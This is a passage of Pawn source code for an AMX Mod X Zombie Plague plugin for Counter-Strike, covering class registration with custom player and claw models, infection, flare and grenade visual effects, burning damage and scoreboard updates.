		nummodels_custom = ArrayGetCell(g_zclass2_modelsend, i) - ArrayGetCell(g_zclass2_modelsstart, i)
		nummodels_default = ArrayGetCell(g_zclass_modelsend, g_zclass_i) - ArrayGetCell(g_zclass_modelsstart, g_zclass_i)
		
		// Replace each player model and model index
		for (k = 0; k < min(nummodels_custom, nummodels_default); k++)
		{
			ArrayGetString(g_zclass2_playermodel, ArrayGetCell(g_zclass2_modelsstart, i) + k, buffer, charsmax(buffer))
			ArraySetString(g_zclass_playermodel, ArrayGetCell(g_zclass_modelsstart, g_zclass_i) + k, buffer)
			
			// Precache player model and replace its modelindex with the real one
			formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%s.mdl", buffer, buffer)
			ArraySetCell(g_zclass_modelindex, ArrayGetCell(g_zclass_modelsstart, g_zclass_i) + k, precache_model(prec_mdl))
			
			formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%sT.mdl", buffer, buffer)
			if (file_exists(prec_mdl)) precache_model(prec_mdl)
		}
		
		// We have more custom models than what we can accommodate,
		// Let's make some space...
		if (nummodels_custom > nummodels_default)
		{
			for (k = nummodels_default; k < nummodels_custom; k++)
			{
				ArrayGetString(g_zclass2_playermodel, ArrayGetCell(g_zclass2_modelsstart, i) + k, buffer, charsmax(buffer))
				ArrayInsertStringAfter(g_zclass_playermodel, ArrayGetCell(g_zclass_modelsstart, g_zclass_i) + k - 1, buffer)
				
				// Precache player model and retrieve its modelindex
				formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%s.mdl", buffer, buffer)
				ArrayInsertCellAfter(g_zclass_modelindex, ArrayGetCell(g_zclass_modelsstart, g_zclass_i) + k - 1, precache_model(prec_mdl))
				
				formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%sT.mdl", buffer, buffer)
				if (file_exists(prec_mdl)) precache_model(prec_mdl)
			}
			
			// Fix models end index for this class
			ArraySetCell(g_zclass_modelsend, g_zclass_i, ArrayGetCell(g_zclass_modelsend, g_zclass_i) + (nummodels_custom - nummodels_default))
		}
		
		/* --- Not needed since classes can't have more than 1 default model for now ---
		// We have less custom models than what this class has by default,
		// Get rid of those extra entries...
		if (nummodels_custom < nummodels_default)
		{
			for (k = nummodels_custom; k < nummodels_default; k++)
			{
				ArrayDeleteItem(g_zclass_playermodel, ArrayGetCell(g_zclass_modelsstart, g_zclass_i) + nummodels_custom)
			}
			
			// Fix models end index for this class
			ArraySetCell(g_zclass_modelsend, g_zclass_i, ArrayGetCell(g_zclass_modelsend, g_zclass_i) - (nummodels_default - nummodels_custom))
		}
		*/
		
		// Replace clawmodel
		ArrayGetString(g_zclass2_clawmodel, i, buffer, charsmax(buffer))
		ArraySetString(g_zclass_clawmodel, g_zclass_i, buffer)
		
		// Precache clawmodel
		formatex(prec_mdl, charsmax(prec_mdl), "models/zombie_plague/%s", buffer)
		precache_model(prec_mdl)
		
		// Replace health
		buffer[0] = ArrayGetCell(g_zclass2_hp, i)
		ArraySetCell(g_zclass_hp, g_zclass_i, buffer[0])
		
		// Replace speed
		buffer[0] = ArrayGetCell(g_zclass2_spd, i)
		ArraySetCell(g_zclass_spd, g_zclass_i, buffer[0])
		
		// Replace gravity
		buffer2 = Float:ArrayGetCell(g_zclass2_grav, i)
		ArraySetCell(g_zclass_grav, g_zclass_i, buffer2)
		
		// Replace damage
		buffer2 = Float:ArrayGetCell(g_zclass2_dmg, i)
		ArraySetCell(g_zclass_dmg, g_zclass_i, buffer2)
		
		// Replace level
		buffer[0] = ArrayGetCell(g_zclass2_level, i)
		ArraySetCell(g_zclass_level, g_zclass_i, buffer[0])
		
		// Replace reset
		buffer[0] = ArrayGetCell(g_zclass2_reset, i)
		ArraySetCell(g_zclass_reset, g_zclass_i, buffer[0])
	}
	
	// If class was not overriden with customization data
	if (ArrayGetCell(g_zclass_new, g_zclass_i))
	{
		// If not using same models for all classes
		// Precache default class model and replace modelindex with the real one
		formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%s.mdl", model, model)
		ArraySetCell(g_zclass_modelindex, ArrayGetCell(g_zclass_modelsstart, g_zclass_i), precache_model(prec_mdl))
		
		formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%sT.mdl", model, model)
		if (file_exists(prec_mdl)) precache_model(prec_mdl)
		
		// Precache default clawmodel
		formatex(prec_mdl, charsmax(prec_mdl), "models/zombie_plague/%s", clawmodel)
		precache_model(prec_mdl)
	}
	
	// Increase registered classes counter
	g_zclass_i++
	
	// Return id under which we registered the class
	return g_zclass_i-1;
}

// Native: zp_register_human_class
native_register_human_class(const name[], const info[], const model[], const clawmodel[], hp, speed, Float:gravity, armor, Float:dmg, level, reset)
{
	// Arrays not yet initialized
	if (!g_arrays_created)
		return -1;
	
	// Strings passed byref
	/*param_convert(1)
	param_convert(2)
	param_convert(3)
	param_convert(4)*/
	
	// Add the class
	ArrayPushString(g_hclass_name, name)
	ArrayPushString(g_hclass_info, info)
	
	// Using same human models for all classes? NO
	ArrayPushCell(g_hclass_modelsstart, ArraySize(g_hclass_playermodel))
	ArrayPushString(g_hclass_playermodel, model)
	ArrayPushCell(g_hclass_modelsend, ArraySize(g_hclass_playermodel))
	ArrayPushCell(g_hclass_modelindex, -1)
	
	ArrayPushString(g_hclass_clawmodel, clawmodel)
	ArrayPushCell(g_hclass_hp, hp)
	ArrayPushCell(g_hclass_spd, speed)
	ArrayPushCell(g_hclass_grav, gravity)
	ArrayPushCell(g_hclass_armor, armor)
	ArrayPushCell(g_hclass_dmg, dmg)
	ArrayPushCell(g_hclass_level, level)
	ArrayPushCell(g_hclass_reset, reset)
	
	// Set temporary new class flag
	ArrayPushCell(g_hclass_new, 1)
	
	// Override human classes data with our customizations
	new i, k, buffer[32], Float:buffer2, nummodels_custom, nummodels_default, prec_mdl[100], size = ArraySize(g_hclass2_realname)
	for (i = 0; i < size; i++)
	{
		ArrayGetString(g_hclass2_realname, i, buffer, charsmax(buffer))
		
		// Check if this is the intended class to override
		if (!equal(name, buffer))
			continue;
		
		// Remove new class flag
		ArraySetCell(g_hclass_new, g_hclass_i, 0)
		
		// Replace caption
		ArrayGetString(g_hclass2_name, i, buffer, charsmax(buffer))
		ArraySetString(g_hclass_name, g_hclass_i, buffer)
		
		// Replace info
		ArrayGetString(g_hclass2_info, i, buffer, charsmax(buffer))
		ArraySetString(g_hclass_info, g_hclass_i, buffer)
		
		// Replace models, unless using same models for all classes
		nummodels_custom = ArrayGetCell(g_hclass2_modelsend, i) - ArrayGetCell(g_hclass2_modelsstart, i)
		nummodels_default = ArrayGetCell(g_hclass_modelsend, g_hclass_i) - ArrayGetCell(g_hclass_modelsstart, g_hclass_i)
		
		// Replace each player model and model index
		for (k = 0; k < min(nummodels_custom, nummodels_default); k++)
		{
			ArrayGetString(g_hclass2_playermodel, ArrayGetCell(g_hclass2_modelsstart, i) + k, buffer, charsmax(buffer))
			ArraySetString(g_hclass_playermodel, ArrayGetCell(g_hclass_modelsstart, g_hclass_i) + k, buffer)
			
			// Precache player model and replace its modelindex with the real one
			formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%s.mdl", buffer, buffer)
			ArraySetCell(g_hclass_modelindex, ArrayGetCell(g_hclass_modelsstart, g_hclass_i) + k, precache_model(prec_mdl))
			
			formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%sT.mdl", buffer, buffer)
			if (file_exists(prec_mdl)) precache_model(prec_mdl)
		}
		
		// We have more custom models than what we can accommodate,
		// Let's make some space...
		if (nummodels_custom > nummodels_default)
		{
			for (k = nummodels_default; k < nummodels_custom; k++)
			{
				ArrayGetString(g_hclass2_playermodel, ArrayGetCell(g_hclass2_modelsstart, i) + k, buffer, charsmax(buffer))
				ArrayInsertStringAfter(g_hclass_playermodel, ArrayGetCell(g_hclass_modelsstart, g_hclass_i) + k - 1, buffer)
				
				// Precache player model and retrieve its modelindex
				formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%s.mdl", buffer, buffer)
				ArrayInsertCellAfter(g_hclass_modelindex, ArrayGetCell(g_hclass_modelsstart, g_hclass_i) + k - 1, precache_model(prec_mdl))

				formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%sT.mdl", buffer, buffer)
				if (file_exists(prec_mdl)) precache_model(prec_mdl)
			}
			
			// Fix models end index for this class
			ArraySetCell(g_hclass_modelsend, g_hclass_i, ArrayGetCell(g_hclass_modelsend, g_hclass_i) + (nummodels_custom - nummodels_default))
		}
		
		/* --- Not needed since classes can't have more than 1 default model for now ---
		// We have less custom models than what this class has by default,
		// Get rid of those extra entries...
		if (nummodels_custom < nummodels_default)
		{
			for (k = nummodels_custom; k < nummodels_default; k++)
			{
				ArrayDeleteItem(g_hclass_playermodel, ArrayGetCell(g_hclass_modelsstart, g_hclass_i) + nummodels_custom)
			}
			
			// Fix models end index for this class
			ArraySetCell(g_hclass_modelsend, g_hclass_i, ArrayGetCell(g_hclass_modelsend, g_hclass_i) - (nummodels_default - nummodels_custom))
		}
		*/
		
		// Replace clawmodel
		ArrayGetString(g_hclass2_clawmodel, i, buffer, charsmax(buffer))
		ArraySetString(g_hclass_clawmodel, g_hclass_i, buffer)
		
		// Precache clawmodel
		formatex(prec_mdl, charsmax(prec_mdl), "models/%s", buffer)
		precache_model(prec_mdl)
		
		// Replace health
		buffer[0] = ArrayGetCell(g_hclass2_hp, i)
		ArraySetCell(g_hclass_hp, g_hclass_i, buffer[0])
		
		// Replace speed
		buffer[0] = ArrayGetCell(g_hclass2_spd, i)
		ArraySetCell(g_hclass_spd, g_hclass_i, buffer[0])
		
		// Replace gravity
		buffer2 = Float:ArrayGetCell(g_hclass2_grav, i)
		ArraySetCell(g_hclass_grav, g_hclass_i, buffer2)
		
		// Replace armor
		buffer[0] = ArrayGetCell(g_hclass2_armor, i)
		ArraySetCell(g_hclass_armor, g_hclass_i, buffer[0])
		
		// Replace damage
		buffer2 = Float:ArrayGetCell(g_hclass2_dmg, i)
		ArraySetCell(g_hclass_dmg, g_hclass_i, buffer2)
		
		// Replace level
		buffer[0] = ArrayGetCell(g_hclass2_level, i)
		ArraySetCell(g_hclass_level, g_hclass_i, buffer[0])
		
		// Replace reset
		buffer[0] = ArrayGetCell(g_hclass2_reset, i)
		ArraySetCell(g_hclass_reset, g_hclass_i, buffer[0])
	}
	
	// If class was not overriden with customization data
	if (ArrayGetCell(g_hclass_new, g_hclass_i))
	{
		// If not using same models for all classes
		// Precache default class model and replace modelindex with the real one
		formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%s.mdl", model, model)
		ArraySetCell(g_hclass_modelindex, ArrayGetCell(g_hclass_modelsstart, g_hclass_i), precache_model(prec_mdl))
		
		formatex(prec_mdl, charsmax(prec_mdl), "models/player/%s/%sT.mdl", model, model)
		if (file_exists(prec_mdl)) precache_model(prec_mdl)
		
		// Precache default clawmodel
		formatex(prec_mdl, charsmax(prec_mdl), "models/%s", clawmodel)
		precache_model(prec_mdl)
	}
	
	// Increase registered classes counter
	g_hclass_i++
	
	// Return id under which we registered the class
	return g_hclass_i-1;
}

/*================================================================================
 [Custom Messages]
=================================================================================*/

// Custom Night Vision
public set_user_nvision(taskid)
{
	// Get player's origin
	static origin[3]
	get_user_origin(ID_NVISION, origin)
	
	// Nightvision message
	message_begin(MSG_ONE_UNRELIABLE, SVC_TEMPENTITY, _, ID_NVISION)
	write_byte(TE_DLIGHT) // TE id
	write_coord(origin[0]) // x
	write_coord(origin[1]) // y
	write_coord(origin[2]) // z
	write_byte(80) // radius
	
	// Nemesis / Madness / Spectator in nemesis round
	if( gArmageddonRound && g_survivor[ID_NVISION] && !g_nemesis[ID_NVISION] )
	{
		write_byte(0) // r
		write_byte(0) // g
		write_byte(200) // b
	}
	if (g_nemesis[ID_NVISION] || (g_zombie[ID_NVISION] && g_nodamage[ID_NVISION]) || (!g_isalive[ID_NVISION] && g_nemround))
	{
		write_byte(150) // r
		write_byte(0) // g
		write_byte(0) // b
	}
	// Human / Zombie / Spectator in normal round
	else
	{
		write_byte(g_color_nvg[ID_NVISION][0])
		write_byte(g_color_nvg[ID_NVISION][1])
		write_byte(g_color_nvg[ID_NVISION][2])
	}
	
	write_byte(2) // life
	write_byte(0) // decay rate
	message_end()
}

// Custom Flashlight
/*public set_user_flashlight(taskid)
{
	// Get player and aiming origins
	static Float:originF[3], Float:destoriginF[3]
	pev(ID_FLASH, pev_origin, originF)
	fm_get_aim_origin(ID_FLASH, destoriginF)
	
	// Max distance check
	if (get_distance_f(originF, destoriginF) > 1000)
		return;
	
	// Send to all players?
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, destoriginF, 0)
	//message_begin(MSG_ONE_UNRELIABLE, SVC_TEMPENTITY, _, ID_FLASH)
	
	// Flashlight
	write_byte(TE_DLIGHT) // TE id
	engfunc(EngFunc_WriteCoord, destoriginF[0]) // x
	engfunc(EngFunc_WriteCoord, destoriginF[1]) // y
	engfunc(EngFunc_WriteCoord, destoriginF[2]) // z
	write_byte(10) // radius
	write_byte(100) // r
	write_byte(100) // g
	write_byte(100) // b
	write_byte(3) // life
	write_byte(0) // decay rate
	message_end()
}*/

// Infection special effects
infection_effects(id)
{
	// Screen fade? (unless frozen)
	if (!g_frozen[id])
	{
		message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, id)
		write_short(UNIT_SECOND) // duration
		write_short(0) // hold time
		write_short(FFADE_IN) // fade type
		if (g_nemesis[id])
		{
			write_byte(150) // r
			write_byte(0) // g
			write_byte(0) // b
		}
		else
		{
			write_byte(g_color_nvg[id][0])
			write_byte(g_color_nvg[id][1])
			write_byte(g_color_nvg[id][2])
		}
		write_byte (255) // alpha
		message_end()
	}
	
	// Screen shake?
	message_begin(MSG_ONE_UNRELIABLE, g_msgScreenShake, _, id)
	write_short(UNIT_SECOND*4) // amplitude
	write_short(UNIT_SECOND*2) // duration
	write_short(UNIT_SECOND*10) // frequency
	message_end()
	
	// Get player's origin
	static origin[3]
	get_user_origin(id, origin)
	
	// Tracers?
	message_begin(MSG_PVS, SVC_TEMPENTITY, origin)
	write_byte(TE_IMPLOSION) // TE id
	write_coord(origin[0]) // x
	write_coord(origin[1]) // y
	write_coord(origin[2]) // z
	write_byte(128) // radius
	write_byte(20) // count
	write_byte(3) // duration
	message_end()
	
	// Particle burst?
	message_begin(MSG_PVS, SVC_TEMPENTITY, origin)
	write_byte(TE_PARTICLEBURST) // TE id
	write_coord(origin[0]) // x
	write_coord(origin[1]) // y
	write_coord(origin[2]) // z
	write_short(50) // radius
	write_byte(70) // color
	write_byte(3) // duration (will be randomized a bit)
	message_end()
	
	// Light sparkle?
	message_begin(MSG_PVS, SVC_TEMPENTITY, origin)
	write_byte(TE_DLIGHT) // TE id
	write_coord(origin[0]) // x
	write_coord(origin[1]) // y
	write_coord(origin[2]) // z
	write_byte(20) // radius
	write_byte(g_color_nvg[id][0])
	write_byte(g_color_nvg[id][1])
	write_byte(g_color_nvg[id][2])
	write_byte(2) // life
	write_byte(0) // decay rate
	message_end()
}

// Nemesis/madness aura task
public zombie_aura(taskid)
{
	// Not nemesis, not in zombie madness
	if (!g_nemesis[ID_AURA] && !g_nodamage[ID_AURA])
	{
		// Task not needed anymore
		remove_task(taskid);
		return;
	}
	
	// Get player's origin
	static origin[3]
	get_user_origin(ID_AURA, origin)
	
	// Colored Aura
	message_begin(MSG_PVS, SVC_TEMPENTITY, origin)
	write_byte(TE_DLIGHT) // TE id
	write_coord(origin[0]) // x
	write_coord(origin[1]) // y
	write_coord(origin[2]) // z
	write_byte(20) // radius
	write_byte(150) // r
	write_byte(0) // g
	write_byte(0) // b
	write_byte(2) // life
	write_byte(0) // decay rate
	message_end()
}

// Flare Lighting Effects
flare_lighting(entity, duration)
{
	// Get origin and color
	static Float:originF[3], color[3]
	pev(entity, pev_origin, originF)
	pev(entity, PEV_FLARE_COLOR, color)
	
	// Lighting
	engfunc(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_DLIGHT) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	write_byte(22) // radius
	write_byte(color[0]) // r
	write_byte(color[1]) // g
	write_byte(color[2]) // b
	write_byte(51) //life
	write_byte((duration < 2) ? 3 : 0) //decay rate
	message_end()
	
	// Sparks
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_SPARKS) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	message_end()
}

// Bubble - Force Push
public ForcePush(entity)
{
	static Victima, Float:Origin[3], Float:Velocidad[3], Float:Direccion[3], players[33], i, owner;
	entity_get_vector( entity, EV_VEC_origin, Origin )
	owner = entity_get_edict( entity, EV_ENT_owner )
	
	Victima = -1
	i = 0
	
	while( ( Victima = find_ent_in_sphere( Victima, Origin, NADE_BUBBLE_RADIUS + 20.0 ) ) != 0 )
	{
		if(Victima <= g_maxplayers)
		{
			if(g_isalive[Victima])
				players[i++] = Victima;
		}
		else if(0 < owner <= g_maxplayers && g_zombie[owner])
		{
		
			static Float:velocity[3]
			pev(Victima, pev_velocity, velocity)
			
			if(vector_length(velocity) > 5.0)
			{
				entity_get_vector( Victima, EV_VEC_origin, Direccion )
				xs_vec_sub( Direccion, Origin, Direccion )
				xs_vec_normalize( Direccion, Direccion )
			
				xs_vec_mul_scalar( Direccion, FORCE_PUSH, Direccion )
				xs_vec_add( velocity, Direccion, velocity )
			
				set_pev(Victima, pev_velocity, velocity)
			}
		}
	}
	
	for(new id; id < i; id++)
	{
		if(!g_zombie[players[id]])
		{
			entity_get_vector( players[id], EV_VEC_origin, Direccion )
			if(get_distance_f(Origin, Direccion) > NADE_BUBBLE_RADIUS) g_nodamage[players[id]] = 0
			else g_nodamage[players[id]] = 1
		}
		else if((gArmageddonRound && g_nemesis[players[id]]) || (!g_nemesis[players[id]] && !g_nodamage[players[id]] && !gTroll[players[id]]))
		{
			entity_get_vector( players[id], EV_VEC_origin, Direccion )
			xs_vec_sub( Direccion, Origin, Direccion )
			xs_vec_normalize( Direccion, Direccion )
			
			get_user_velocity( players[id], Velocidad )
			
			xs_vec_mul_scalar( Direccion, FORCE_PUSH, Direccion )
			xs_vec_add( Velocidad, Direccion, Velocidad )
			
			set_user_velocity( players[id], Velocidad )
		}
	}
}

// Burning Flames
public burning_flame(taskid)
{
	// Get player origin and flags
	static origin[3], flags
	get_user_origin(ID_BURN, origin)
	flags = pev(ID_BURN, pev_flags)
	
	// Madness mode - in water - burning stopped
	if (g_nodamage[ID_BURN] || (flags & FL_INWATER) || g_burning_duration[ID_BURN] < 1)
	{
		// Smoke sprite
		message_begin(MSG_PVS, SVC_TEMPENTITY, origin)
		write_byte(TE_SMOKE) // TE id
		write_coord(origin[0]) // x
		write_coord(origin[1]) // y
		write_coord(origin[2]-50) // z
		write_short(g_smokeSpr) // sprite
		write_byte(random_num(15, 20)) // scale
		write_byte(random_num(10, 20)) // framerate
		message_end()
		
		g_burning_duration[ID_BURN] = 0
		
		// Task not needed anymore
		remove_task(taskid);
		return;
	}
	
	// Randomly play burning zombie scream sounds (not for nemesis)
	if (!g_nemesis[ID_BURN] && !random_num(0, 20))
	{
		//static sound[64]
		//ArrayGetString(grenade_fire_player, random_num(0, ArraySize(grenade_fire_player) - 1), sound, charsmax(sound))
		emit_sound(ID_BURN, CHAN_VOICE, gSOUND_FIRE_PLAYER[random_num(0, sizeof gSOUND_FIRE_PLAYER -1)], 1.0, ATTN_NORM, 0, PITCH_NORM)
	}
	
	// Get player's health
	static health
	health = get_user_health(ID_BURN)
	
	// Take damage from the fire
	if ((health - 15) > 0)
		set_user_health(ID_BURN, health - 15)
	
	// Flame sprite
	message_begin(MSG_PVS, SVC_TEMPENTITY, origin)
	write_byte(TE_SPRITE) // TE id
	write_coord(origin[0]+random_num(-5, 5)) // x
	write_coord(origin[1]+random_num(-5, 5)) // y
	write_coord(origin[2]+random_num(-10, 10)) // z
	write_short(g_flameSpr) // sprite
	write_byte(random_num(5, 10)) // scale
	write_byte(200) // brightness
	message_end()
	
	// Decrease burning duration counter
	g_burning_duration[ID_BURN]--
}

// Infection Bomb: Green Blast
create_blast(const Float:originF[3])
{
	// Smallest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+385.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(200) // green
	write_byte(0) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
	
	// Medium ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+470.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(200) // green
	write_byte(0) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
	
	// Largest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+555.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(200) // green
	write_byte(0) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
}

// Fire Grenade: Fire Blast
create_blast2(const Float:originF[3])
{
	// Smallest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+385.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(200) // red
	write_byte(100) // green
	write_byte(0) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
	
	// Medium ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+470.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(200) // red
	write_byte(50) // green
	write_byte(0) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
	
	// Largest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+555.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(200) // red
	write_byte(0) // green
	write_byte(0) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
}

// Frost Grenade: Freeze Blast
create_blast3(const Float:originF[3])
{
	// Smallest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+385.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(100) // green
	write_byte(200) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
	
	// Medium ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+470.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(100) // green
	write_byte(200) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
	
	// Largest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+555.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(100) // green
	write_byte(200) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
}

// Fix Dead Attrib on scoreboard
FixDeadAttrib(id)
{
	message_begin(MSG_BROADCAST, g_msgScoreAttrib)
	write_byte(id) // id
	write_byte(0) // attrib
	message_end()
}

// Send Death Message for infections
SendDeathMsg(attacker, victim)
{
	message_begin(MSG_BROADCAST, g_msgDeathMsg)
	write_byte(attacker) // killer
	write_byte(victim) // victim
	write_byte(1) // headshot flag
	write_string("infection") // killer's weapon
	message_end()
}

// Update Player Frags and Deaths
UpdateFrags(attacker, victim, frags, deaths, scoreboard)
{
	// Set attacker frags
	//if( get_user_frags(attacker) < 32766 )
	set_pev(attacker, pev_frags, float(pev(attacker, pev_frags) + frags))
	
	// Set victim deaths
	//if( cs_get_user_deaths(victim) < 32766 )
	set_pdata_int(victim, OFFSET_CSDEATHS, cs_get_user_deaths(victim) + deaths, OFFSET_LINUX)
	
	// Update scoreboard with attacker and victim info
	if (scoreboard)
	{
		message_begin(MSG_BROADCAST, g_msgScoreInfo)
		write_byte(attacker) // id
		write_short(pev(attacker, pev_frags)) // frags
		write_short(cs_get_user_deaths(attacker)) // deaths
		write_short(0) // class?
		write_short(fm_cs_get_user_team(attacker)) // team
		message_end()
		
		message_begin(MSG_BROADCAST, g_msgScoreInfo)
		write_byte(victim) // id
		write_short(pev(victim, pev_frags)) // frags
		write_short(cs_get_user_deaths(victim)) // deaths
		write_short(0) // class?
		write_short(fm_cs_get_user_team(victim)) // team
		message_end()
	}
}

// Plays a sound on clients
PlaySound(const sound[]) client_cmd(0, "spk ^"%s^"", sound)

/*================================================================================
 [Stocks]
=================================================================================*/

// Solid
stock IsSolid( Entidad )
	return ( Entidad ? ( ( entity_get_int( Entidad, EV_INT_solid ) > SOLID_TRIGGER ) ? true : false ) : true )

// ColorChat
stock CC( const id, const input[], any:... )
{
	static count; count = 1
	static users[32]
	static msg[191]
	vformat( msg, 190, input, 3 )
	
	replace_all( msg, 190, "!y" , "^1" )
